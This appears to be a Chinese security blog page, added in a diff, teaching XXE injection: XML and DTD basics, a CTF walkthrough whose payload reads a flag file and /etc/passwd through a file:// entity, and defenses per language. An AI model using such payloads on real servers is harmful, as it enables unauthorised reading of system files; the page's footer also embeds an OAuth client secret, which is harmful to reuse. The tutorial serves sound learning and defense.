@@ -1,0 +1,174 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="XML External Entity attack/XXE攻击"><meta name="keywords" content="xxe"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>XML External Entity attack/XXE攻击 | J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#XML外部实体注入-XML-External-Entity"><span class="toc-number">1.</span> <span class="toc-text">XML外部实体注入(XML External Entity)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xml文档结构"><span class="toc-number">2.</span> <span class="toc-text">xml文档结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#api调用"><span class="toc-number">3.</span> <span class="toc-text">api调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xxe防御"><span class="toc-number">4.</span> <span class="toc-text">xxe防御</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">28</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="https://bossgirl.github.io/">八千国家奖学金</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://dxxblog.top/">xx_C1</a><a class="author-info-links__name text-center" href="http://www.cooper111.xyz/">花郎世纪</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/zhuxianjin/images/master/topimg.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="post-info"><div id="post-title">XML External Entity attack/XXE攻击</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-10</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>&#8203;&#8203;&#8203;</p>
+<a id="more"></a>
+<h4 id="XML外部实体注入-XML-External-Entity"><a href="#XML外部实体注入-XML-External-Entity" class="headerlink" title="XML外部实体注入(XML External Entity)"></a>XML外部实体注入(XML External Entity)</h4><blockquote>
+<p>XML 指可扩展标记语言（eXtensible Markup Language）</p>
+</blockquote>
+<blockquote>
+<p>XML 被设计用来传输和存储数据。</p>
+</blockquote>
+<blockquote>
+<p>HTML 被设计用来显示数据。</p>
+</blockquote>
+<h4 id="xml文档结构"><a href="#xml文档结构" class="headerlink" title="xml文档结构"></a>xml文档结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明--&gt; </span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!--文档类型定义--&gt; </span><br><span class="line">&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt; </span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt; </span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt; </span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt; </span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt; </span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt; ]]]&gt; &lt;!--文档元素--&gt; </span><br><span class="line">&lt;note&gt; </span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt; </span><br><span class="line">&lt;from&gt;Tom&lt;/from&gt; </span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt; </span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt; </span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+<p>其中包括XML声明、DTD文档类型定义（可选）、文档元素</p>
+<ul>
+<li>DTD(Document Type Definition）<ul>
+<li>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li>内部声明DTD<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>引用外部DTD<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>或者<code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>内部声明实体<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>引用外部实体<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>或者<code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>参数实体<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code>或者<code>&lt;!ENTITY % 实体名称 &quot;URI&quot;&gt;</code></li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的</li>
+</ul>
+</blockquote>
+<p>不同程序支持的协议</p>
+<table>
+<thead>
+<tr>
+<th>libxml2</th>
+<th>PHP</th>
+<th>Java</th>
+<th>.NET</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file</td>
+<td>file</td>
+<td>file</td>
+<td>file</td>
+</tr>
+<tr>
+<td>http</td>
+<td>http</td>
+<td>http</td>
+<td>http</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td></td>
+<td>php</td>
+<td>https</td>
+<td>https</td>
+</tr>
+<tr>
+<td></td>
+<td>compress.zlib</td>
+<td>jar      </td>
+</tr>
+<tr>
+<td></td>
+<td>compress.bzip2</td>
+<td>netdoc</td>
+</tr>
+<tr>
+<td></td>
+<td>data</td>
+<td>mailto </td>
+</tr>
+<tr>
+<td></td>
+<td>glob</td>
+<td>gopher      </td>
+</tr>
+<tr>
+<td></td>
+<td>phar</td>
+</tr>
+</tbody>
+</table>
+<p>包含内部实体的XML文档：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE entity [</span><br><span class="line">  &lt;!ENTITY copyright &quot;Copyright wiki.wooyun.org&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;wooyun&gt;</span><br><span class="line">  &lt;internal&gt;&amp;copyright;&lt;/internal&gt;</span><br><span class="line">&lt;/wooyun&gt;</span><br></pre></td></tr></table></figure>
+<p>包含外部实体的XML文档：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE entity [</span><br><span class="line">  &lt;!ENTITY wiki SYSTEM &quot;http://wiki.wooyun.org/&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;wooyun&gt;</span><br><span class="line">  &lt;external&gt;&amp;wiki;&lt;/external&gt;</span><br><span class="line">&lt;/wooyun&gt;</span><br></pre></td></tr></table></figure>
+<p>一些仅使用JSON去访问服务的客户端， 可能接受XML作为输入内容，这是可以修改Content-Type为xml看是否解析发送的内容</p>
+<p>比如发送内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [&lt;!ENTITY test2 &quot;test3&quot;&gt;]&gt;</span><br><span class="line">&lt;t&gt;&amp;test2;&lt;/t&gt;</span><br></pre></td></tr></table></figure>
+<p>意思大概是我们定义了一个名为test2的，值为test3的实体<code>&lt;t&gt;&amp;test2;&lt;/t&gt;</code>将实体呈现出来</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9ce6098d0.png" alt="clip_5.png"></p>
+<p>只要稍加修改便可以访问系统上本地文件或是远程系统上的文件</p>
+<p>如<code>&lt;!ENTITY test2 &quot;test3&quot;&gt;</code>改为<code>&lt;!ENTITY test2 SYSTEM &quot;file:///home/test3.txt&quot;&gt;</code>，便可读取<code>/home/test3.txt</code>文件</p>
+<p>以一道题为例</p>
+<h4 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h4><p>设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
+<p>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
+<p>抓包可看到传输的json数据</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9ce60b27e.png" alt="clip_6.png"></p>
+<p>将Content-Type: application/json改为Content-Type: application/xml并传输xml格式的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE flag [ &lt;!ENTITY abc SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;flag&gt;&amp;abc;&lt;/flag&gt;</span><br></pre></td></tr></table></figure>
+<p>读取flag</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9ce60e06b.png" alt="clip_7.png"></p>
+<p>也可以读取<code>/etc/passwd</code></p>
+<p><img src="https://i.loli.net/2018/07/29/5b5d9ce60ca14.png" alt="clip_8.png"></p>
+<h4 id="xxe防御"><a href="#xxe防御" class="headerlink" title="xxe防御"></a>xxe防御</h4><ol>
+<li>使用开发语言提供的禁用外部实体的方法</li>
+</ol>
+<p>PHP：</p>
+<p><code>libxml_disable_entity_loader(true);</code></p>
+<p>JAVA:</p>
+<p><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</code></p>
+<p><code>dbf.setExpandEntityReferences(false);</code></p>
+<p>Python：</p>
+<p><code>from lxml import etree</code></p>
+<p><code>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></p>
+<ol start="2">
+<li>过滤用户提交的XML数据</li>
+</ol>
+<p>关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者，<code>SYSTEM</code>和<code>PUBLIC</code></p>
+<p>参考：</p>
+<p><a href="https://www.cnblogs.com/tongwen/p/5194483.html" target="_blank" rel="noopener">XML External Entity attack/XXE攻击 </a></p>
+<p><a href="http://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">浅谈XXE攻击</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a></p>
+<p><a href="https://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">XXE漏洞以及Blind XXE总结</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/06/10/k14-xxe/">http://yoursite.com/2018/06/10/k14-xxe/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com">J0k3r</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/xxe/">xxe</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/06/16/masscan/"><i class="fa fa-chevron-left">  </i><span>Masscan 快速的IP端口扫描器</span></a></div><div class="next-post pull-right"><a href="/2018/05/01/iscc-wp/"><span>ISCC-2018-WP</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitment-container"></div><script>var gitment = new Gitment({
+  id: md5(decodeURI(location.pathname)),
+  owner: 'zhuxianjin',
+  repo: 'zhuxianjin.github.io',
+  oauth: {
+    client_id: '10dcae32e6ed34a16cc',
+    client_secret: '7d1ef2b81d50d3f2f24e87ca3251840506c944d2'
+  }
+})
+gitment.render('gitment-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/zhuxianjin/images/master/topimg.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script></body></html>
